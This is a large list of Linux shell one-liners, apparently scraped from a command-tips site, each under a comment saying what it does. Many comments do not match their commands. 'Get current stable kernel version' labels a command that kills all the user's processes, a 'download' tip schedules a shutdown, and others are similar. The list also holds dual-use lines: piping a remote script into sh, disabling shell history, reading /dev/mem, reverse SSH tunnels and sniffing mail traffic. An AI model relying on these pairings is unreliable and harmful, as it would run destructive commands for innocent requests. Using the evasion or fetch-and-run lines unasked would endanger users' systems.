# Avoids ssh timeouts by sending a keep alive message to the server every 60 seconds
echo 'ServerAliveInterval 60' >> /etc/ssh/ssh_config
# Unlock more space form your hard drive
very_long_command& sleep 10; kill $!
# connects to a serial console
screen /dev/ttyS0 9600
# List open IPv4 connections
lsof -Pnl +M -i4
# list processes with established tcp connections (without netstat)
lsof -i -n | grep ESTABLISHED
# List top ten files/directories sorted by size
du -sb *|sort -nr|head|awk '{print $2}'|xargs du -sh
# Makes the permissions of file2 the same as file1
getfacl file1 | setfacl --set-file=- file2
# Show some trivia related to the current date
calendar
# ssh -A user@somehost
ssh -A user@somehost
# convert single digit to double digits
rename 's/\d+/sprintf("%02d",$&)/e' -- $@
# Replace space in filename
rename "s/ *//g" *.jpg
# Lists installed kernels
ls -1 /lib/modules
# Print a row of characters across the terminal
seq -s'#' 0 $(tput cols) | tr -d '[:digit:]'
# A fun thing to do with ram is actually open it up and take a peek. This command will show you all the string (plain text) values in ram
strings /dev/mem|less
# Quickly CD Out Of Directories
up() { [ $(( $1 + 0 )) -gt 0 ] && cd $(eval "printf '../'%.0s {1..$1}"); }
# Get all mac address
ip link show
# Produce a pseudo random password with given length in base 64
openssl rand -base64 <length>
# Find out how old a web page is
sed 's/[0-9]\+/ [&] /g'
# Don't save commands in bash history (only for current session)
unset HISTFILE
# Find the process you are looking for minus the grepped one
ps -ef | grep c\\ommand
# Get the full path to a file
readlink -e /bin/ls
# remove comments (even those starting with spaces), empty lines (even those containing spaces) in one grep command
grep -vE '^\s*(#|$)' textfile
# Find 'foo' string inside files
find . -type f -print | xargs grep foo
# Convert unix timestamp to date
date -ud "1970-01-01 + 1234567890 seconds"
# Refresh the cache of font directory
sudo fc-cache -f -v
# Get all possible problems from any log files
grep -2 -iIr "err\|warn\|fail\|crit" /var/log/*
# Tail a log-file over the network
On PC1:  nc -l -p 6666 > /dev/dsp   On PC2:  cat /dev/dsp | nc <PC1's IP> 6666
# List files opened by a PID
lsof -p 15857
# sort lines by length
awk '{print length, $0;}' | sort -nr
# Determining the excat memory usages by certain PID
pmap -d <<pid>>
# drop first column of output by piping to this
tr -s ' ' | cut -d' ' -f2-
# How to secure delete a file
shred -u -z -n 17 rubricasegreta.txt
# Record output of any command using 'tee' at backend; mainly can be used to capture the output of ssh from client side while connecting to a server.
ssh user@server | tee logfilename
# Transforms a file to all uppercase.
tr '[:lower:]' '[:upper:]' <"$1"
# Remove a range of lines from a file
vi +'<start>,<end>d' +wq <filename>
# Shows what processes need to be restarted after system upgrade
deadlib() { lsof | grep 'DEL.*lib' | cut -f 1 -d ' ' | sort -u; }
# convert UNIX timestamp to UTC timestamp
TZ=UTC date -d @1320198157
# network interface and routing summary
nmap --iflist
# Go to the previous sibling directory in alphabetical order
cd ../"$(ls -F ..|grep '/'|grep -B1 `basename $PWD`|head -n 1)"
# Adding Prefix to File name
mv {,prefix_}yourfile.txt
# Takes all file except file between !()
rm !(file_to_keep_undeleted)
# Check if a domain is available and get the answer in just one line
whois domainnametocheck.com | grep match
# find previously entered commands
<ctrl>+r
# List .log files open by a pid
lsof -p 1234 | grep -E "\.log$" | awk '{print $NF}'
# Are there any words in the English language that use at least half of the alphabet without repeating any letters?
cat /usr/share/dict/words | egrep '^\w{13,}$' | egrep -iv '(\w).*\1'
# Random Number Between 1 And 256
od -An -N1 -tu1 /dev/random
# Press Any Key to Continue
read -sn 1 -p 'Press any key to continue...';echo
# determine if tcp port is open
nc -zw2 www.example.com 80 && echo open
# Get a regular updated list of zombies
watch "ps auxw | grep [d]efunct"
# Test network speed without wasting disk
dd if=/dev/zero bs=4096 count=1048576 | ssh user@host.tld 'cat > /dev/null'
# Count the total number of files in each immediate subdirectory
find . -type f -printf "%h\n" | cut -d/ -f-2 | sort | uniq -c | sort -rn
# Examine processes generating traffic on your website
netstat -np | grep -v ^unix
# Insert a colon between every two digits
sed 's/\(..\)/\1:/g;s/:$//' mac_address_list
# List your MACs address
ifconfig eth0 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'
# New command with the last argument of the previous command.
command !$
# need ascii art pictures for you readme text ?
boxes -d dog  or   cowsay -f tux $M
# Test for Weak SSL Ciphers
openssl s_client -connect [host]:[sslport] -cipher LOW
# find system's indianness
python -c "import sys;print (sys.byteorder) + ' endian'"
# launch bash without using any letters
"$(- 2>&1)";${_%%:*}
# Cleanup Docker
sudo docker rm $(docker ps -a -q); sudo docker rmi $(docker images -q)
# Create a file and manipulate the date
touch -d '-1 year' /tmp/oldfile
# Check if network cable is plugged in and working correctly
tr A-Z a-z | tr -cs a-z '\n' | sort | uniq -c
# remove ^M characters from file using sed
sed 's/\r//g' < input.txt >  output.txt
# Merge tarballs
cat 1.tar.gz 2.tar.gz > 3.tar.gz; tar zxvfi 3.tar.gz
# Getting information about model no. of computer
ls /usr/bin | shuf -n 1
# Who needs pipes?
B <<< $(A)
# Find all active ip's in a subnet
nmap -v -sP 192.168.0.0/16 10.0.0.0/8
# Undo
[Ctrl+_]
# Generate a random password 30 characters long
pwgen 30 1
# Regex to remove HTML-Tags from a file
sed -e :a -e 's/<[^>]*>//g;/</N;//ba' index.html
# Lists all usernames in alphabetical order
cut -d: -f1 /etc/passwd | sort
# Source zshrc/bashrc in all open terminals
trap "source ~/.zshrc" USR1
# Get MX records for a domain
dig foo.org mx +short
# Find the process you are looking for minus the grepped one
ps -C command
# Using NMAP to check if a port is open or close
nmap -oG - -T4 -p22 -v 192.168.0.254 | grep ssh
# Convert text to uppercase
upper() { echo ${@^^}; }
# do a full file listing of every file found with locate
wget -c -t 1 --load-cookies ~/.cookies/rapidshare <URL>
# quickly backup or copy a file with bash
cp -bfS.bak filename filename
# Sort specific lines while editing within vi
:33,61 !sort
# tail, with specific pattern colored
tail -F file | egrep --color 'pattern|$'
# Complete TCP Handshake on a given host-port
nc -zvw 1 host port
# Enable automatic typo correction for directory names
shopt -s cdspell
# bash pause command
read -sn1 -p "Press any key to continue..."; echo
# Smart renaming
ls | sed -n -r 's/banana_(.*)_([0-9]*).asc/mv & banana_\2_\1.asc/gp' | sh
# Delete all but latest file in a directory
ls -pt1 | sed '/.*\//d' | sed 1d | xargs rm
# insert ip range using vim
:for i in range(1,255) | .put='192.168.0.'.i | endfor
# Query Wikipedia via console over DNS
mwiki () { blah=`echo $@ | sed -e 's/ /_/g'`; dig +short txt $blah.wp.dg.cx; }
# Transfer large files/directories with no overhead over the network
ssh user@host "cd targetdir; tar cfp - *" | dd of=file.tar
# Display ncurses based network monitor
nload -u m eth0
# Show complete URL in netstat output
netstat -tup -W | column -t
# Get HTTP status code with curl
curl --write-out %{http_code} --silent --output /dev/null localhost
# Show top 50 running processes ordered by highest memory/cpu usage refreshing every 1s
watch -n1 "ps aux --sort=-%mem,-%cpu | head -n 50"
# Stop All Wine Apps and Processes
wineserver -k
# Display the top ten running processes - sorted by memory usage
ps aux --sort -rss | head
# Sort IPV4 ip addresses
sort -t. -k1,1n -k2,2n -k3,3n -k4,4n
# Renaming a file without overwiting an existing file name
mv -b old_file_name new_and_already_existent_file_name
# ascii digital clock
watch -tn1 'date +%T | xargs banner'
# Convert file type to unix utf-8
ex some_file "+set ff=unix fileencoding=utf-8" "+x"
# When was your OS installed?
ls -lct /etc/ | tail -1 | awk '{print $6, $7, $8}'
# Remove invalid key from the known_hosts file for the IP address of a host
ssh-keygen -R `host hostname | cut -d " " -f 4`
# Remount root in read-write mode.
sudo mount -o remount,rw /
# Runs a command without hangups.
screen -d -m command &
# Determine an image's dimensions
identify -format "%wx%h" /path/to/image.jpg
# move up through directories faster (set in your /etc/profile or .bash_profile)
function up { cd $(eval printf '../'%.0s {1..$1}) && pwd; }
# Lock the hardware eject button of the cdrom
eject -i 1
# Sort files by size
ls -l | sort -nk5
# Simplest way to get size (in bytes) of a file
du -b filename
# do 'foo' until it exits successfully, pausing in between crashes
until foo some args; do echo "crashed: $?  respawning..." >&2; sleep 10; done
# Prepend text to a file
echo "text to prepend" | cat - file
# draw honeycomb
yes "\\__/ " | tr "\n" " " | fold -$((($COLUMNS-3)/6*6+3)) | head -$LINES
# Clone IDE Hard Disk
sudo dd if=/dev/hda1 of=/dev/hdb2
# Show exit status of all portions of a piped command eg. ls |this_doesn't_exist |wc
echo ${PIPESTATUS[@]}
# use vi key bindings at the command line
set -o vi
# lotto generator
shuf -i 1-49 | head -n6 | sort -n| xargs
# Shows cpu load in percent
sed -e 's/ .*//' -e 's/\.//' -e 's/^0*//' /proc/loadavg
# Show bash's function definitions you defined in .bash_profile or .bashrc
declare -f [ function_name ]
# Type a random string into a X11 window
sleep 3 && xdotool type --delay 0ms texthere
# Turn On/Off Keyboard LEDs via commandline
sudo nethogs eth0
# Get a free shell account on a community server
sh <(curl hashbang.sh)
# Randomly run command
ran() { [ $((RANDOM%100)) -lt "$1" ] && shift && "$@"; }
# Print a row of 50 hyphens
seq -s" " -50 -1 | tr -dc -
# Get a list of all TODO/FIXME tasks left to be done in your project
alias tasks='grep --exclude-dir=.git -rEI "TODO|FIXME" . 2>/dev/null'
# Prepare a commandlinefu command.
goclf() { type "$1" | sed '1d' | tr -d "\n" | tr -s '[:space:]'; echo }
# Expand shortened URLs
expandurl() { curl -sIL $1 | grep ^Location; }
# Display all readline binding that use CTRL
bind -p | grep -F "\C"
# Have your sound card call out elapsed time.
for ((x=0;;x+=5)); do sleep 5; espeak $x & done
# Show a Command's Short Description
whatis [command-name]
# Get line number of all matches in a file
awk '/match/{print NR}' file
# Get IPv4 of eth0 for use with scripts
ifconfig eth0 | grep "inet " | cut -d ':' -f2 | awk '{print $1}'
# Get the full path to a file
realpath examplefile.txt
# Output as many input
echo 'foo' | tee >(wc -c) >(grep o) >(grep f)
# AWK Calculator
calc(){ awk "BEGIN{ print $* }" ;}; calc "((3+(2^3)) * 34^2 / 9)-75.89"
# gpg decrypt a file
gpg --output foo.txt --decrypt foo.txt.pgp
# Print IP of any interface. Useful for scripts.
ip route show dev ppp0 | awk '{ print $7 }'
# Synchronize both your system clock and hardware clock and calculate/adjust time drift
ntpdate pool.ntp.org && hwclock --systohc && hwclock --adjust
# use wget to check if a remote file exists
wget --spider $URL 2>&1 | awk '/Length/ {print $2}'
# Show line numbers in a text file
cat -n file.txt
# Convert a script to one-liner
(sed 's/#.*//g'|sed '/^ *$/d'|tr '\n' ';'|xargs echo) < script.sh
# Synchronize date and time with a server over ssh
ssh user@server sudo date -s @`( date -u +"%s" )`
# run a command from within vi without exiting
:! <bash_command>
# Rename file to same name plus datestamp of last modification.
mv -iv $FILENAME{,.$(stat -c %Z $FILENAME)}
# copy ACL of one file to another using getfacl and setfacl
getfacl file1 | setfacl --set-file=- file2
# Disable beep sound from your computer
echo "blacklist pcspkr"|sudo tee -a /etc/modprobe.d/blacklist.conf
# Write on the console without being registered
_ls
# Which fonts are installed?
fc-list | cut -d ':' -f 1 | sort -u
# Highlight network TX, RX information change
watch -n 2 -d '/sbin/ifconfig eth0'
# Kill all processes belonging to a single user.
kill -9 `ps -u <username> -o "pid="`
# Recursive chmod all files and directories within the current directory
chmod -R 774 .
# Take screenshots with imagemagick
import -window root -quality 98 screenshot.png
# What is my public IP-address?
dig @208.67.222.222 myip.opendns.com
# list block devices
sudo lsblk -o name,type,fstype,label,partlabel,model,mountpoint,size
# set your ssd disk as a non-rotating medium
sudo echo 0 > /sys/block/sdb/queue/rotational
# gag version of current date
ddate
# Follow the flow of a log file
tailf file.log
# Make changes in .bashrc immediately available
source ~/.bashrc
# Show current iptables rules, with line numbers
iptables -nL -v --line-numbers
# Share your terminal session (remotely or whatever)
screen -x
# Always tail/edit/grep the latest file in a directory of timestamped files
tail -f /path/to/timestamped/files/file-*(om[1])
# Indent a one-liner.
type <function name>
# Print a random 8 digit number
jot -r -n 8 0 9 | rs -g 0
# Rsync two directories with filtered extensions
rsync -rv --include '*/' --include '*.txt' --exclude '*' srcDir/ desDir/
# list your device drivers
lspci -vv
# List bash functions defined in .bash_profile or .bashrc
declare -F | cut -d ' ' -f 3
# Read a keypress without echoing it
stty cbreak -echo; KEY=$(dd bs=1 count=1 2>/dev/null); stty -cbreak echo
# diff files while disregarding indentation and trailing white space
diff -b $file1 $file2 # GNU Tools
# See size of partitions as human readable
parted /dev/sda print
# Capture SMTP / POP3 Email
sudo tcpdump -nn -l port 25 | grep -i 'MAIL FROM\|RCPT TO'
# useful tail on /var/log to avoid old logs or/and gzipped files
tail -f *[!.1][!.gz]
# Alias for lazy tmux create/reattach
tmux attach || tmux new
# Compress files found with find
find ~/bin/ -name "*sh" -print0 | xargs -0t tar -zcvf foofile.tar.gz
# Pack up some files into a tarball on a remote server without writing to the local filesystem
tar -czf - * | ssh example.com "cat > files.tar.gz"
# Batch rename extension of all files in a folder, in the example from .txt to .md
tar -czvvf backup$(date "+%Y%m%d_%H%M%S").tar.gz /path/to/dir
# Count the number of characters in each line
awk '{count[length]++}END{for(i in count){printf("%d: %d\n", count[i], i)}}'
# Installing True-Type fonts
ttmkfdir mkfontdir fc-cache /usr/share/fonts/miscttf
# Simple colourized JSON formatting for BASH
sed '/MARKER/{N;s/THIS/THAT/}'
# Go to parent directory of filename edited in last command
cd `dirname $_`
# Count occurrences per minute in a log file
grep <something> logfile | cut -c2-18 | uniq -c
# View details of network activity, malicious or otherwise within a port range.
lsof -i :555-7000
# A bit of privacy in .bash_history
export HISTCONTROL=ignoreboth
# Converts a single FLAC file with associated cue file into multiple FLAC files
ssh -D 8888 user@site.com
# Copy ssh keys to user@host to enable password-less ssh logins.
ssh-copy-id user@host
# Get all mac address
ifconfig | awk '/HWaddr/ { print $NF }'
# Sync the date of one server to that of another.
sudo date -s  "$(ssh user@server.com "date -u")"
# Get the absolute path of a file
absolute_path () { readlink -f "$1"; };
# An alternative to: python -m SimpleHTTPServer for Arch Linux
python3 -m http.server
# Using Git, stage all manually deleted files.
git add -u
# Add existing user to a group
usermod -a -G groupname username
# Remove color codes (special characters) with sed
sed -r "s/\x1B\[([0-9]{1,3}((;[0-9]{1,3})*)?)?[m|K]//g
# Find duplicate UID in /etc/passwd
awk -F":" '!list[$3]++{print $3}' /etc/passwd
# Replace all in last command
!!:gs/data/index/
# Use top to monitor only all processes with the same name fragment 'foo'
top $(pgrep foo | sed 's|^|-p |g')
# Add a Clock to Your CLI
export PS1="${PS1%\\\$*}"' \t \$ '
# Look for IPv4 address in files.
alias ip4grep "grep -E '([0-9]{1,3}\.){3}[0-9]{1,3}'"
# get time in other timezones
tzwatch
# Show the power of the home row on the Dvorak Keyboard layout
egrep -ci ^[aoeuidhtns-]+$ /usr/share/dict/words
# Change the window title of your xterm
echo "^[]0;My_Title_Goes _Here^G"
# Instead of saying RTFM!
echo "[q]sa[ln0=aln256%Pln256/snlbx]sb729901041524823122snlbxq"|dc
# grep (or anything else) many files with multiprocessor power
find . -type f | parallel -j+0 grep -i foobar
# Dump dvd from a different machine onto this one.
ssh user@machine_A dd if=/dev/dvd0 > dvddump.iso
# Insert a comment on command line for reminder
ls -alh #mycomment
# for too many arguments by *
echo *.log | xargs <command>
# connects to a serial console
cu -s 9600 -l /dev/ttyS0
# Find files and list them sorted by modification time
find -printf "%C@ %p\n"|sort
# Get current stable kernel version string from kernel.org
pkill -u `whoami`
# Clean up the garbage an accidental unzipping makes
unzip -Z -1 <filename.zip> | xargs -I{} rm -v {}
# determine if tcp port is open
lsof -i :22
# detach remote console for long running operations
dtach -c /tmp/wires-mc mc
# Comment out a line in a file
sed -i '19375 s/^/#/' file
# simple backup with rsync
0 10 * * * rsync -rau /[VIPdirectory] X.X.X.X:/backup/[VIPdirectory]
# Reset terminal that has been buggered by binary input or similar
stty sane
# Dump root ext3 fs over ssh
dump 0f - / | bzip -c9 | ssh user@host "cat > /home/user/root.dump.bz2"
# Get a regular updated list of zombies
watch "ps auxw | grep 'defunct' | grep -v 'grep' | grep -v 'watch'"
# Sort the current buffer in vi or vim.
:%sort
# Show Apt/Dpkg configuration
apt-config dump
# BASH one-liner to get the current week number
date +"%V"
# Delete all empty lines from a file with vim
:v/./d
# Remote copy directories and files through an SSH tunnel host
rsync -avz -e 'ssh -A sshproxy ssh' srcdir remhost:dest/path/
# Unix time to local time
date -R -d @1234567890
# Happy Days
echo {'1,2,3',4}" o'clock" ROCK
# print all network interfaces' names and IPv4 addresses
alias ips='ip a | awk '\''/inet /&&!/ lo/{print $NF,$2}'\'' | column -t'
# Monitoring file handles used by a particular process
lsof -c <process name> -r
# Pass TAB as field separator to sort, join, cut, etc.
sort -t $'\t' -k 2 input.txt
# Share a screen session
screen -x <screen_id>
# List files
Esc-/ Esc-/
# Follow the most recently updated log files
ls -drt /var/log/* | tail -n5 | xargs sudo tail -n0 -f
# Determine MAC address of remote host when you know its IP address
arping 192.168.1.2
# Backup entire system through SSH
ssh -C USER@HOST tar -c --exclude /proc --exclude /sys / | tar -x
# ps with parent/child process tree
ps auxf
# make, or run a script, everytime a file in a directory is modified
while inotifywait -r -e MODIFY dir/; do make; done;
# Command to rename multiple file in one go
rename 's/.xls/.ods/g' *.xls
# Check if a process is running
kill -0 [pid]
# display date of last time a process was started in `date` format
ps -o lstart <pid>
# Simplification of "sed 'your sed stuff here' file > file2 && mv file2 file"
sed -i 'your sed stuff here' file
# prints line numbers
cat -n
# Remove all files except list
rm -rf !(@(file1|file2|...))
# Show drive names next to their full serial number (and disk info)
find /dev/disk/by-id -type l -printf "%l\t%f\n" | cut -b7- | sort
# convert all flac files in a folder to mp3 files with a bitrate of 192 kbps
for f in *;do flac -cd $f |lame -b 192 - $f.mp3;done
# Migrate existing Ext3 filesystems to Ext4
find . -iname '*.mp3' -type f -print0 | xargs -I{} -0 cp {} </path>
# display information about the CPU
lscpu | egrep 'Model name|Socket|Thread|NUMA|CPU\(s\)'
# copy ACL of one file to another using getfacl and setfacl
getfacl <file-with-acl> | setfacl -f - <file-with-no-acl>
# kill all processes using a directory/file/etc
lsof|grep /somemount/| awk '{print $2}'|xargs kill
# Print current runlevel
who -r
# Remove all leading and trailing spaces or tabs from all lines of a text file
while read l; do echo -e "$l"; done <1.txt >2.txt
# Lookup your own IPv4 address
dig +short myip.opendns.com @resolver1.opendns.com
# Viewable terminal session over network.
mkfifo /tmp/view; nc -l 9876 < /tmp/view& script -f /tmp/view
# Create a file of a given size in linux
dd if=/dev/zero of=foo.txt bs=1M count=1
# Rename all (jpg) files written as 3 number in 4 numbers.
for i in ???.jpg; do mv $i $(printf %04d $(basename $i .jpg) ).jpg ; done
# Checks throughput between two nodes
cat /dev/zero | pv | ssh 192.168.1.2 "cat > /dev/null"
# Perform sed substitution on all but the last line of input
sed -e "$ ! s/$/,/"
# Convert ascii string to hex
echo -n "text" | od -A n -t x1 |sed 's/ /\\x/g'
# Find the package a command belongs to on debian-based distros
du -hs * | grep '^[0-9,]*[MG]' | sort -rn
# Report all quota usage
quota -q $(cat /etc/passwd|cut -d ':' -f 1)
# Create date based backups
backup() { for i in "$@"; do cp -va $i $i.$(date +%Y%m%d-%H%M%S); done }
# let the cow suggest some commit messages for you
aplay -c 2 -f S16_LE -r 44100 /dev/urandom
# return external ip
wget -O - -q icanhazip.com
# download file1 file2 file3 file4 .... file 100
shutdown -h +240
# Remove a file whose name begins with a dash ( - ) character
rm ./-filename
# Lists all usernames in alphabetical order
awk -F ':' '{print $1 | "sort";}' /etc/passwd
# Generate pretty secure random passwords
pwgen -Bnyc
# Create a tar of directory structure only
tar -cf ~/out.tar --no-recursion --files-from <(find . -type d)
# Want to known what time is it in another part of the world ?
TZ=Indian/Maldives date
# Change the case of a single word in vim
g~w
# Clean up display when the bash prompt is displayed
export PS1="\[\017\033[m\033[?9l\033[?1000l\]$PS1"
# Get size of terminal
resize
# Mount proc
mount -t proc{,,}
# matrix in your term
!!:s/foo/bar/
# tree command limit depth for recusive directory list
tree -L 2 -u -g -p -d
# Group OR'd commands where you expect only one to work
( zcat $FILE || gzcat $FILE || bzcat2 $FILE ) | less
# Remove Thumbs.db files from folders
rm -f **/Thumbs.db
# convert filenames in current directory to lowercase
for i in *; do mv "$i" "$(echo $i|tr A-Z a-z)"; done
# copy timestamps of files from one location to another - useful when file contents are already synced but timestamps are wrong.
find . -printf "touch -m -d \"%t\" '%p'\n" | tee /tmp/retime.sh
# Watch the disk fill up
watch -n 1 df
# Function to output an ASCII character given its decimal equivalent
chr () { printf \\$(($1/64*100+$1%64/8*10+$1%8)); }
# for loop with leading zero in bash 3
seq -s " " -w 3 20
# vim read stdin
ls | vim +'set bt=nowrite' -
# remove empty lines in place with backup
sed -e '/^$/d' -i .bak filewithempty.lines
# Console clock
watch -t -n1 'date "+%r %F %A"'
# Email yourself after a job is done
<command>; echo "job done"|mail email@email.com -s'job done'
# Date shows dates at other times/dates
date -d '2 weeks ago'
# Found how how much memory in kB $PID is occupying in Linux
echo 0$(awk '/Pss/ {printf "+"$2}' /proc/$PID/smaps)|bc
# Find size in kilobyte of files that are deleted but still in use and therefore consumes diskspace
lsof -ns | grep REG | grep deleted | awk '{s+=$7/1024} END {print s}'
# Create a large test file (taking no space).
dd bs=1 seek=2TB if=/dev/null of=ext3.test
# Create a backup of file being edited while using vi
:!cp % %-
# gawk gets fixed width field
ls -l | gawk -v FIELDWIDTHS='1 3 3 3' '{print $2}'
# Switch to a user with "nologin" shell
sudo -u username bash
# cleanup /tmp directory
find /tmp -type f -atime +1 -delete
# Fibonacci numbers with awk
awk 'func f(n){return(n<2?n:f(n-1)+f(n-2))}BEGIN{while(a<24){print f(a++)}}'
# Remove all the files except abc in the directory
find * -maxdepth 1 -type f ! -name abc -delete
# Number of CPU's in a system
$ nproc
# Email a file to yourself
uuencode $file $file | /usr/bin/mailx -s "$file" ${USER}
# Reverse SSH
ssh -f -N -R 8888:localhost:22 user@somedomain.org
# Clear terminal Screen
<ctrl+l>
# trace the system calls made by a process (and its children)
strace -f -s 512 -v ls -l
# Print a row of characters across the terminal
printf -v row "%${COLUMNS}s"; echo ${row// /#}
# Open a file explorer on a split screen inside your vim session
:Sex
# Easy Persistent SSH Connections Using Screen
s() { screen -d -RR -m -S "$1" -t "$USER"@"$1" ssh "$1"; }
# Forget remembered path locations of previously ran commands
hash -r
# FizzBuzz one-liner in Python
python -c'for i in range(1,101):print"FizzBuzz"[i*i%3*4:8--i**4%5]or i'
# Convert mp3/wav file to asterisk ulaw for music on hold (moh)
vim `git diff --name-only`
# Securely destroy data (including whole hard disks)
shred targetfile
# tee to a file descriptor
tee >(cat - >&2)
# Split lossless audio (ape, flac, wav, wv) by cue file
sed -r "s:\x1B\[[0-9;]*[mK]::g"'
# print all except first collumn
awk '{$1=""; print}'
# colored prompt
export PS1='\[\033[0;35m\]\h\[\033[0;33m\] \w\[\033[00m\]: '
# Take screenshot through SSH
xwd -root -display :0.0| xwdtopnm | pnmtopng > Screenshot.png
# uniq for unsorted data
awk '!_[$0]++{print}'
# Get Futurama quotations from slashdot.org servers
curl -Is slashdot.org | sed -n '5p' | sed 's/^X-//'
# detect partitions
lsblk -o NAME,TYPE,FSTYPE,LABEL,SIZE,MODEL,MOUNTPOINT
# List processes playing sound
lsof | grep pcm
# Avoiding history file to be overwritten
shopt -s histappend
# Print all the lines between 10 and 20 of a file
sed '10,20!d'
# List processes sorted by CPU usage
ps -ef --sort=-%cpu
# find files larger than 1 GB, everywhere
find / -type f -size +1000000000c
# Big Countdown Clock with hours, minutes and seconds
watch -tn1 'date +%r | figlet'
# renice by name
renice +5 -p $(pidof <process name>)
# open a seperate konsole tab and ssh to each of  N  servers (konsole 4.2+)
for i in $(cat listofservers.txt); do konsole --new-tab -e ssh $i; done
# Print a horizontal line
printf "%`tput cols`s"|sed "s/ /_/g"
# Watch how fast the files in a drive are being deleted
watch "df | grep /path/to/drive"
# Gets the last string of previous command with !$
$mkdir mydir -> mv !$ yourdir -> $cd !$
# Debug SSH at the Maximum Verbosity Level
alias sshv='ssh -vvv -o LogLevel=DEBUG3'
# Prepend a text to a file.
sed -i '1s/^/text to prepend\n/' file1
# Filter IPs out of files
egrep -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' file.txt
# Recursively remove directory with many files quickly
blank=$(mktemp -d); rsync --delete "$blank/" "bigdir/"; rmdir "$blank"
# print date 24 hours ago
date --date=yesterday
# How much RAM is Apache using?
ps -o rss -C httpd | tail -n +2 | (sed 's/^/x+=/'; echo x) | bc
# Quick command line math
expr 512 \* 7
# List Listen Port by numbers
netstat -tlpn | sort -t: -k2 -n
# Introduction to user commands
man intro
# Encryption file in commad line
gpg -c <filename>
# SMTP Analysis
tcpdump -l -s0 -w - tcp dst port 25 | strings | grep -i 'MAIL FROM\|RCPT TO'
# Connect via sftp to a specific port
sftp -oPort=3476 user@host
# Email yourself a short note
quickemail() { echo "$*" | mail -s "$*" email@email.com; }
# Capitalize first letter of each word in a string
echo 'fOo BaR' | tr '[A-Z]' '[a-z]' | sed 's/\(^\| \)\([a-z]\)/\1\u\2/g'
# Rename all files in lower case
rename 'y/A-Z/a-z/' *
# Poor man's ntpdate
date -s "$(curl -sD - www.example.com | grep '^Date:' | cut -d' ' -f3-6)Z"
# count and number lines of output, useful for counting number of matches
ps aux | grep [a]pache2 | nl
# Listing only one repository with yum
yum --disablerepo=* --enablerepo=epel list available
# List directories recursively showing its sizes using only ls and grep
ls -lhR | grep -e "total\|:$"
# Show all the available information about your current distribution, package management and base
echo /etc/*_ver* /etc/*-rel*; cat /etc/*_ver* /etc/*-rel*
# Randomize lines in a file
awk 'BEGIN{srand()}{print rand(),$0}' SOMEFILE | sort -n | cut -d ' ' -f2-
# delete duplicate lines from a file and keep the order of the other lines
cat -n <file> | sort -k 2 | uniq -f 1 | sort -n | cut -f 2-
# Delete line number 10 from file
sed -i '10d' <somefile>
# display contents of a file w/o any comments or blank lines
egrep '^[^#]' some_file
# Cap apt-get download speed
echo "SECRET MESSAGE" | gpg -e --armor -s | sendmail USER@DOMAIN.COM
# diff output of two commands
diff <(tail -10 file1) <(tail -10 file2)
# watch iptables counters
watch 'iptables -vL'
# remove empty lines
sed '/^$/d'
# capture selected window
lockfile
# An alias to re-run last command with sudo. Similar to "sudo !!"
alias please='sudo $(fc -ln -1)'
# Undo several commits by committing an inverse patch.
git diff HEAD..rev | git apply --index; git commit
# Remove several files with ease
rm file{1..10}
# Colorize matching string without skipping others
egrep --color=auto 'usb|' /var/log/messages
# Edit your command in vim ex mode by &lt;ctrl-f&gt;
<ctrl-f> in ex mode in vim
# Converts all pngs in a folder to webp using all available cores
parallel cwebp -q 80 {} -o {.}.webp ::: *.png
# tar exclude files or directories
tar -cvzf home_backup.tar.gz --exclude={.*,Downloads} /home/<user>
# pid of manually selecting window
ps -p $$
# Display summary of git commit ids and messages for a given branch
git log master | awk '/commit/ {id=$2} /\s+\w+/ {print id, $0}'
# Who invoked me? / Get parent command
ps -o comm= -p $(ps -o ppid= -p $$)
# Open (in vim) all modified files in a git repository
vim `git status --porcelain | sed -ne 's/^ M //p'`
# Massive change of file extension (bash)
for file in *.txt; do mv "${file%.txt}{.txt,.xml}"; done
# Show top running processes by the number of open filehandles they have
lsof | awk '{print $1}' | sort | uniq -c | sort -rn | head
# Add a GPL license file to your project
ip -o -4 a s
# Find UTF-8 text files misinterpreted as ISO 8859-1 due to Byte Order Mark (BOM) of the Unicode Standard.
find . -type f | grep -rl $'\xEF\xBB\xBF'
# Maximum PNG compression with optipng, advpng, and advdef
optipng -o3 *png && advpng -z -4 *png && advdef -z -4 *png
# Create a persistent remote Proxy server through an SSH channel
ssh -fND localhost:PORT USER@SSH_ENABLED_SERVER
# continuously check size of files or directories
watch -n <time_interval> "du -s <file_or_directory>"
# Extract title from HTML files
awk 'BEGIN{IGNORECASE=1;FS="<title>|</title>";RS=EOF} {print $2}' file.html
# Extract tarball from internet without local saving
find . -maxdepth 1 -type f | wc -l
# syncronizing datas beetween two folder (A and B) excluding some directories in A (dir1 and dir2)
rsync -av --ignore-existing --exclude="dir1" --exclude="dir2" /pathA /pathB
# create new branch from stashed changes
git stash branch testchanges
# a fast way to repeat output a byte
tr '\0' '\377' < /dev/zero|dd count=$((<bytes>/512))
# ps a process keeping the header info so you know what the columns of numbers mean!
ps auxw |egrep "PID|process_to_look_at"
# tree by modify time with newest file at bottom
tree -L 1 -ChDit | tac
# Show the date of easter
ncal -e
# Convert decimal numbers to binary
function decToBin { echo "ibase=10; obase=2; $1" | bc; }
# Get the list of root nameservers for a given TLD
dig +short NS org.
# A rainbow-colored Tux gives a fortune cookie for the day. Great
fortune -s | cowsay -f tux | lolcat -s 64
# Create black and white image
convert -colorspace gray face.jpg gray_face.jpg
# Send command to all terminals in a screen session
<ctrl+a>:at "#" stuff "echo hello world^M"
# Extract extention of a file
filext () { echo ${1##*.}; }
# Downsample mp3s to 128K
for f in *.mp3 ; do lame --mp3input -b 128 "$f" ./resamp/"$f" ; done
# Quick key/value display within /proc or /sys
grep -r . /sys/class/net/eth0/statistics
# show framebuffer console modes to use in grub vga option
sudo hwinfo --framebuffer
# remote diff with side-by-side ordering.
ssh $HOST -l$USER cat /REMOTE/FILE | sdiff /LOCAL/FILE -
# write text or append to a file
cat <<.>> somefilename
# Indent a one-liner.
declare -f <function name>
# locate bin, src, and man file for a command
whereis somecommand
# remove leading blank lines
sed '/./,$!d'
# Remove Backup Files
find / -name *~ -delete
# Show established network connections
lsof -i | grep -i estab
# Install your ssh key file on a remote system
ssh user@remote 'cat >> ~/.ssh/authorized_keys2' < ~/.ssh/id_rsa.pub
# reverse order of file
sed '1!G;h;$!d'
# shell bash iterate number range with for loop
for((i=1;i<=10;i++)){ echo $i; }
# Sort on multiple dis-contiguous keys/fields (can even specify key number/field from the end)
